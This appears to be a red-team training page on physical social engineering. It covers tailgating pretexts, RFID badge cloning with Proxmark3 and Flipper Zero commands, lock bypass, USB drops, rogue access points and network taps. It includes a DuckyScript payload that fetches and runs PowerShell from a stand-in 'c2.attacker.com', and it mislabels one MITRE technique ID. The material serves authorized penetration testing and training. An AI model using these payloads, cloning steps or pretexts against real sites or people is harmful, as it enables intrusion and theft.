---
layout: training-page
title: "Physical Social Engineering — Red Team Academy"
module: "Social Engineering"
tags:
  - physical
  - social-engineering
  - rfid
  - lock-picking
  - tailgating
page_key: "se-physical"
render_with_liquid: false
---

# Physical Social Engineering

Physical social engineering tests whether an attacker can bypass physical security controls through manipulation, impersonation, and deception rather than force. It is one of the most impactful components of a red team engagement — a successful physical intrusion demonstrates access to facilities, infrastructure, and data that technical controls cannot protect.

## Overview

### What Physical SE Tests

Physical SE engagements typically evaluate:

```
Physical access controls:
  - Reception and visitor management processes
  - Badge-controlled entry (tailgating susceptibility)
  - Escort policies for visitors and contractors
  - Sensitive area access (server rooms, finance floors, executive areas)

Human behaviour:
  - Employee compliance with clean desk policies
  - Response to strangers in restricted areas
  - Helpfulness leading to door holding / badge lending
  - Reaction to implausible or unusual requests

Technical physical controls:
  - RFID/access card security (clonability)
  - Physical lock quality and bypass resistance
  - CCTV coverage and monitoring
  - Alarm and tailgate detection systems
```

### Typical Objectives

```
Low impact:
  - Confirm tailgating is possible without badge
  - Document access to unlocked workstations
  - Retrieve documents from unlocked drawers or printers
  - Photograph server room, network diagrams, whiteboards

Medium impact:
  - Clone an access badge
  - Plant a USB device in a common area
  - Access a specific floor or area (HR, finance, IT)
  - Install a rogue Wi-Fi access point

High impact:
  - Physical access to an unlocked server
  - Retrieve printed credentials or sensitive documents
  - Plant a hardware network tap on a network switch
  - Access a workstation and establish a foothold
```

### Legal and Authorization Requirements

```
CRITICAL: Physical SE MUST be explicitly authorised in writing before any attempt.

Required documentation:
  - Signed Statement of Work explicitly listing physical SE activities
  - Rules of Engagement document covering:
      - Which sites / buildings are in scope
      - Which areas are in scope (all floors, or specific floors only)
      - What actions are permitted (tailgate only vs active badge cloning)
      - Whether planting devices is authorised
      - Time window for the engagement
  - Authorization letter (printed on client letterhead):
      - Names of all operators conducting physical tests
      - Contact number for the client's security/facilities team
      - "This person is conducting an authorized security assessment"
      - Signature from client executive or CISO

Carry the authorization letter at ALL times during the physical engagement.
If stopped by security, show the letter immediately.
Do NOT attempt to continue a denied scenario — stop and debrief.
```

---

## Tailgating & Piggybacking

Tailgating is entering a secured area by following an authorized person through a badge-controlled door without badging in independently. It requires no technical skill — only social engineering, timing, and confidence.

### Core Technique

```
Piggybacking (consensual):
  Target holds the door knowing someone is behind them.
  Attacker appears legitimate enough to be trusted.
  Triggered by common courtesy — most people hold doors.

Tailgating (non-consensual):
  Attacker follows closely enough that the door doesn't close
  before they can enter. No interaction required.
  More suspicious — requires confident body language.
```

### Timing for Maximum Success

```
Morning rush (8:00 – 9:30am):
  - High volume of badge-ins
  - People in a hurry, not focused on those behind them
  - Groups entering together — easy to blend in

Lunch hour (12:00 – 1:30pm):
  - People returning from outside → badge back in
  - Delivery drivers and food couriers during this window
  - Less formal atmosphere — more door-holding

Delivery windows (varies by site):
  - Couriers often arrive during morning/mid-morning
  - Delivery persona: "I have a package for [real name], hands full"
  - Many facilities wave through delivery staff without badging

Shift handoffs (varies by industry):
  - 24/7 facilities have shift changeovers (6am, 2pm, 10pm)
  - Handoff periods: higher traffic, distracted staff

End of day (5:00 – 6:30pm):
  - People leaving, fewer entering — less effective for entry
  - But unlocked doors / propped fire exits more likely as people leave
```

### Props and Appearance

```
Hands full creates door-holding reflex:
  - Cardboard boxes (printer paper boxes, Amazon boxes)
  - Laptop bag + coffee tray (both hands occupied)
  - Toolbox or equipment case

Authority signals:
  - High-visibility yellow/orange vest
  - Clipboard with forms or a work order printout
  - Lanyard with generic badge holder (badge facing away)
  - Contractor ID holder (easily made with generic template)
  - Logo'd polo shirt matching a known vendor or IT team

Conversation starters when approaching:
  "Morning! Mind getting the door? I've got both hands full."
  "Thanks — running late, appreciate it."
  [Nod and smile — most people hold without asking for ID]
```

### Scenario Example: Delivery Persona

```
Prop:     Cardboard box addressed to a real employee (found via OSINT)
Attire:   Generic blue polo, lanyard, cargo trousers
Script:   "Hi, I have a delivery for [Employee Name] in IT —
           she's expecting this. Can you buzz me through?
           I just need a signature."

Success factor: The name is real (researched), the scenario is expected,
and the "both hands full" prop makes door-holding automatic.
```

---

## Badge Cloning & RFID

Many corporate access control systems use RFID cards that can be silently cloned by an attacker in proximity. The clone can then be used to gain access as if it were the original card.

### Common RFID Frequencies and Standards

```
125kHz (Low Frequency — LF):
  - Technologies: HID Prox, EM4100, AWID, Indala
  - Security: NO encryption — only a fixed card ID (CSN) is transmitted
  - Cloning: trivially easy — read and replay the ID
  - Still extremely common in corporate environments
  - Range: typically 5–20cm with consumer readers; up to 1m+ with long-range

13.56MHz (High Frequency — HF):
  - Technologies: MIFARE Classic, MIFARE Ultralight, DESFire, iClass
  - Security: varies widely
    - MIFARE Classic: weak (Crypto1 cipher is broken) — cloneable
    - MIFARE DESFire EV2/EV3: AES encryption — much harder to clone
    - iClass SE: newer, more secure; older iClass is vulnerable
  - Range: typically 1–10cm

UHF (865–915MHz):
  - Used for long-range access (car parks, gates)
  - Less common for door access
```

### Proxmark3 — RFID Read and Emulate

```bash
# Proxmark3 — premier RFID research tool
# Hardware: proxmark.com (PM3 Easy, PM3 RDV4)
# Firmware: github.com/RfidResearchGroup/proxmark3 (Iceman fork — most current)

# Install client
git clone https://github.com/RfidResearchGroup/proxmark3 /opt/proxmark3
cd /opt/proxmark3
make clean && make all
sudo make install

# Connect PM3 to USB, then launch client:
proxmark3 /dev/ttyACM0

# Detect card type
pm3 --> auto

# Read HID Prox card (125kHz)
pm3 --> lf hid read
# Output: [+] HID Prox TAG ID: 2006ec0d13 - Format: HID 26-bit (H10301)

# Clone HID Prox to a T5577 writable card
pm3 --> lf hid clone --rawid 2006ec0d13
# Place T5577 blank card on antenna during this step

# Simulate (emulate without writing to card)
pm3 --> lf hid sim --rawid 2006ec0d13

# Read MIFARE Classic (13.56MHz)
pm3 --> hf mf autopwn
# Runs automated attack: attempts default keys, then nested attack
# If successful: dumps card sectors to file

# Write MIFARE Classic clone to blank card
pm3 --> hf mf restore --1k  # for 1K cards
# With decrypted dump file

# Read and emulate DESFire (harder — usually UID-only copy)
pm3 --> hf 14a reader
pm3 --> hf 14a sim -u <UID>
```

### Flipper Zero — RFID Read/Write/Emulate

```
Flipper Zero — portable, pocket-sized multi-tool
Hardware: flipperzero.one (~$170 retail)

RFID capabilities:
  125kHz (LF):
    - Read: EM4100, HID Prox, HID iClass, Paradox, Noralsy, Pyramid, Viking
    - Write: T5577 cards (most common blank card format)
    - Emulate: all read formats
  
  13.56MHz (HF via NFC module):
    - Read: MIFARE Classic, Ultralight, NTAG, DESFire (UID only for EV2+)
    - Write: limited writable cards
    - Emulate: MIFARE Classic (if keys are known), Ultralight, NTAG

Flipper workflow for HID Prox cloning:
  1. Main menu → 125 kHz RFID → Read
  2. Hold card to Flipper's back (RFID antenna area)
  3. Flipper displays card ID and format
  4. Save → name the card
  5. Main menu → 125 kHz RFID → Saved → select card → Emulate
  6. Hold Flipper to the reader — door opens

HF (NFC) MIFARE Classic:
  1. Main menu → NFC → Read
  2. For MIFARE Classic: attempts known default keys (FFFE, A0A1A2A3A4A5 etc.)
  3. If all sectors read: save and emulate
  4. If partial read: use Proxmark3 for full attack (nested/darkside)
```

### Long-Range Readers

```
Concept popularized by BishopFox at DEF CON:
"Tastic RFID Thief" — a long-range reader concealed in a bag or
hidden in a physical environment that silently reads cards
from up to 3 feet away without the victim's knowledge.

Components:
  - Long-range HID reader module (e.g., MaxiProx 5375)
  - Arduino or Raspberry Pi for data capture
  - Battery pack for portable operation
  - Data stored to SD card or transmitted via Bluetooth

Modern equivalents:
  - HackID — github.com/lixmk/HackID — concealed LF reader
  - The "Grand Theft RFID" method: conceal reader in backpack,
    stand near badge-wearing employees in elevator, canteen, etc.

Detection countermeasures:
  - RFID-blocking sleeves / wallets (Faraday pouches)
  - Some companies issue DESFire EV2 cards (range-limited, encrypted)
  - Physical security awareness training about badge exposure
```

### Anti-Cloning Measures and UID Randomization

```
Modern countermeasures:
  - DESFire EV2/EV3 with mutual authentication — cannot read card data
  - UID randomization (some newer cards rotate their UID)
  - Challenge-response protocols — replay attacks fail
  - Biometric second factor for high-security areas

When cloning fails:
  - Card uses encryption you cannot break → pivot to social engineering
  - Borrow a badge (shoulder surf PIN + clone in transit)
  - Compromise a registered user's identity
  - Tailgate instead of cloning
  - Focus on areas with lower security (fire exits, delivery areas)
```

---

## Lock Picking & Bypass

Lock picking allows non-destructive entry without the original key. It requires practice but is a realistic attack against standard commercial locks commonly found in offices.

### Essential Tools

```
Pick sets:
  Sparrows Lockpicks — high quality, good range, reasonable price
  Multipick / ELITE picks — German precision picks, more expensive
  Peterson — premium picks, professional grade
  Southord — beginner-friendly, affordable

Common pick types:
  Short hook, medium hook, Gem, Offset Diamond
  City rake, S rake, Bogota rake
  City pick, Offset, Snake

Tension tools (crucial for SPP):
  Top-of-keyway (TOK) tension wrench
  Bottom-of-keyway (BOK) tension wrench
  Double-ended tension bar set
```

### Single Pin Picking (SPP)

```
SPP — most precise technique, works on most 5-pin cylinders:

1. Insert tension wrench at bottom of keyway
2. Apply LIGHT rotational tension in the direction the key turns
3. Insert pick, feel for pins
4. Find the "binding pin" — the one that won't move freely under tension
5. Lift the binding pin until you feel/hear a slight "set" (click)
6. Move to the next binding pin
7. Repeat until all pins are set
8. Cylinder rotates → lock opens

Key principle: pick the binding pin, not all pins at once
Light tension is everything — too much and no pins will set
```

### Raking

```
Raking — faster but less precise than SPP:

1. Insert tension wrench (light tension)
2. Insert rake pick
3. Rapidly move rake in and out while applying light upward pressure
4. Pins bounce to shear line probabilistically
5. Open in 5–60 seconds on cheap/worn locks

Best rakes: Bogota, snake rake, city rake
Works well on: cheap padlocks, worn cylinders, low-security deadbolts
Does NOT work on: high-security pins (spools, serrated), tight tolerances
```

### Bypass Techniques

```
Loiding (credit card shimming):
  - Insert thin flexible tool (loider, credit card, shim) between door
    frame and door latch
  - Push latch back to release
  - Works on: spring latches (round bolt, not deadbolts)
  - Does NOT work on: deadbolts, reverse-bevel latches, or doors with
    anti-loid strips in the frame

Shim attacks (padlocks):
  - Insert two thin shims down each side of the shackle into the locking
    mechanism
  - Depress the shackle catch on both sides simultaneously
  - Opens most unlocked/re-lockable padlocks quickly
  - Sparrows sells padlock shim sets

Bump keys:
  - Cut to the maximum depth on all positions
  - Insert into lock, pull back one position, apply tension, strike key
  - Impact transfers energy to pins momentarily setting them at shear line
  - Works on: most standard pin tumbler locks without anti-bump pins
  - Does NOT work on: Medeco (rotating pins), Abloy (disc detainer),
    Mul-T-Lock (telescoping pins), most high-security cylinders

Under-door tool:
  - A flat "lollipop" bar with a cord looped through
  - Slide under door, loop cord around lever handle
  - Pull cord to depress lever → door opens
  - Works on: lever handles (common in European and Australian offices)
  - Does NOT work on: door knobs, crash bars from outside
```

### High-Security Locks

```
When standard picking won't work:
  Medeco:          Rotating pins + angled keyway → very hard to pick
  Mul-T-Lock:      Telescoping pin system → requires special picks
  Abloy Protec:    Rotating disc system → no pin tumbler, near-impossible
  EVVA MCS:        Magnetic locking elements → pick-resistant

Alternative bypass approaches:
  - Focus on a different door (not all doors are equally secured)
  - Look for unsecured fire exits, loading docks, or roof access
  - Door attack: strike plate bypass, hinge attack, door frame spreading
  - Social engineering to get someone to open the door
  - Identify maintenance periods when locks may be propped open

OPSEC:
  - Wear gloves (nitrile) to avoid leaving fingerprints
  - Non-destructive entry ONLY — never damage locks
  - If a lock resists picking: move on, do not force
  - Document all attempts with outcome in engagement log
```

---

## Dumpster Diving & Document Recovery

Physical documents discarded without shredding can yield significant intelligence for social engineering.

### What to Look For

```
High value:
  - Printed email threads (reveals names, projects, tools, relationships)
  - IT tickets and help desk printouts (system names, credentials)
  - Network diagrams or floor plan maps
  - Organisation charts with names and extensions
  - Access logs or visitor logs
  - Conference call dial-in numbers and passcodes
  - Vendor invoices (reveals active vendors)
  - Job offer letters (reveals salary bands, hiring activity)

Medium value:
  - Meeting agendas (reveals projects, stakeholders, upcoming changes)
  - Internal memos (policy changes, system changes)
  - Delivery manifests or purchase orders
  - Business cards (direct phone numbers, email formats)

Lower value but useful:
  - Printed slide decks (internal processes, org structure)
  - Shredded documents (reconstruction possible with patience)
  - Packaging from IT equipment (reveals hardware models)
```

### Legal Considerations

```
United States:
  - Generally legal once waste is placed in a public collection area
  - California v. Greenwood (1988): no expectation of privacy in trash
  - Varies by state — check local ordinances
  - Private dumpsters on private property: trespassing risk

United Kingdom:
  - Taking items from bins is generally not theft (abandoned property)
  - Trespassing to access bins: separate legal risk
  - Data Protection Act: companies have obligations around document disposal
    (a finding here strengthens your report)

Australia / Canada / EU:
  - Varies significantly by jurisdiction
  - Always confirm with legal counsel before conducting dumpster diving
  - Include explicit authorization in RoE for this activity

Practical OPSEC:
  - Conduct at night or early morning (fewer witnesses)
  - Use gloves (hygiene and forensic cleanliness)
  - Bring bags to take items for later review off-site
  - Photograph in context before removing
  - Return area to original state (do not leave mess)
```

---

## Physical Infrastructure Attacks

### USB Drop Attacks

```
Concept:
  Drop USB devices in high-traffic areas (car park, reception, canteen)
  Curious employees pick them up and plug them in
  HID attack executes payload as if the user typed it

Hardware options:
  Hak5 USB Rubber Ducky  — keystroke injection device
  Bash Bunny             — multi-function attack platform
  O.MG Cable             — malicious charging cable with Wi-Fi C2
  USBKill                — destructive (NOT for red team use)
  Raspberry Pi Zero W    — flexible, WiFi C2 capability, slower

USB Rubber Ducky payload example (DuckyScript):
  DELAY 1000
  GUI r
  DELAY 500
  STRING powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://c2.attacker.com/p')"
  ENTER

Delivery scenarios:
  - Label the USB: "Q4 Salary Review" or "Redundancy List 2026"
  - Leave near printer, in car park, on employee's desk
  - Multiple drops increase success probability

OPSEC:
  - Use gloves when handling USB devices
  - Pre-test payload in isolated lab before engagement
  - Ensure payload is non-destructive and in scope
  - Include a "canary" — unique identifier per USB to track which one was plugged in
```

### Rogue Access Points

```
Hardware:
  Raspberry Pi 4 + Wi-Fi adapter (supports monitor mode)
  GL.iNet travel router (pre-configured for evil twin)
  Hak5 WiFi Pineapple — purpose-built wireless attack platform

Evil twin setup (conceptual):
  1. Identify corporate SSID (e.g., "CorpWiFi-Guest")
  2. Set up AP with identical SSID on same channel or stronger signal
  3. Deauthenticate clients from real AP (optional — noisy)
  4. Clients connect to rogue AP
  5. Intercept HTTP traffic, capture credentials, deliver payloads

Physical placement:
  - Hidden in meeting room, reception area, or bathroom
  - Battery-powered for standalone operation
  - Small form factor (fits in laptop bag or behind furniture)
  - Range: 10–30m typically; directional antenna extends range

Detection by defenders:
  - Wireless IDS (WIDS) — Cisco CleanAir, Mojo Networks
  - Rogue AP scanning — many enterprise Wi-Fi controllers detect
  - Physical inspection during incident response
```

### Network Tap Installation

```
Hardware options:
  Throwing Star LAN Tap     — passive, no power, splits traffic for capture
  Packet Squirrel (Hak5)   — inline network capture with USB storage
  LAN Turtle (Hak5)         — appears as a USB adapter, runs OpenWRT
  Commercial taps: IXIA, Garland Technology

Physical installation:
  1. Identify target network jack (meeting room, unlocked port, patch panel)
  2. Disconnect cable, insert tap inline
  3. Restore original connection through tap
  4. Tap captures all traffic passing through
  5. Connect capture device to monitor port

Targets:
  - Meeting room network jacks (often connected to corporate network)
  - Reception area drops
  - Unlocked network closets
  - Under-desk network ports on unoccupied desks

OPSEC:
  - Low-profile taps designed to look like standard adapters
  - Ensure tap is rated for the network speed in use
  - Confirm scope explicitly covers network tap installation
```

---

## Detection Signals

Understanding what physical security controls can catch allows you to assess the maturity of a client's controls and avoid unnecessary risk.

### What Controls Detect

```
CCTV:
  - Covers entry/exit points, server rooms, reception
  - Modern AI-based systems detect unescorted individuals
  - Footage reviewed after an incident, not always in real time
  - Blind spots: stairwells, side doors, loading docks, bathrooms

Tailgate detection sensors:
  - Weight-based floor sensors in mantrap areas
  - Infrared beam sensors that count people per badge swipe
  - Camera-based people-counting at entrances
  - Alert security desk when count mismatches badge swipe count
  - Not universal — many sites rely on courtesy not to tailgate

Access control logs:
  - Every badge swipe is logged (timestamp, door, card ID)
  - Anomalous access patterns trigger alerts in mature SOC
  - Cloned card creates duplicate access events — detectable post-incident

Visitor management systems:
  - Reception visitor sign-in with photo ID requirement
  - Visitor badge with expiry time printed
  - Host employee notified and must physically escort
  - Some systems (Envoy, Proxyclick) require QR code scan at entry

Security guards:
  - Front desk / reception challenges without appointment
  - Roving patrols — frequency varies widely
  - Security desk monitoring CCTV feeds
  - Many sites rely on staff behaviour rather than dedicated guards
```

---

## Resources

- Proxmark3 — `github.com/RfidResearchGroup/proxmark3`
- Flipper Zero — `flipperzero.one`
- Hak5 — USB Rubber Ducky, LAN Turtle, WiFi Pineapple — `hak5.org`
- Sparrows Lockpicks — `sparrowslockpicks.com`
- MITRE T1200 — Hardware Additions — `attack.mitre.org/techniques/T1200/`
- MITRE T1078 — Valid Accounts — `attack.mitre.org/techniques/T1078/`
- MITRE T1556 — Physical Access — `attack.mitre.org/techniques/T1556/`
- The Art of Intrusion — Kevin Mitnick
- Deviant Ollam — Physical Penetration Testing resources — `deviantollam.com`
- BosnianBill (YouTube) — lock picking demonstrations and reviews
- LockPickingLawyer (YouTube) — lock security reviews
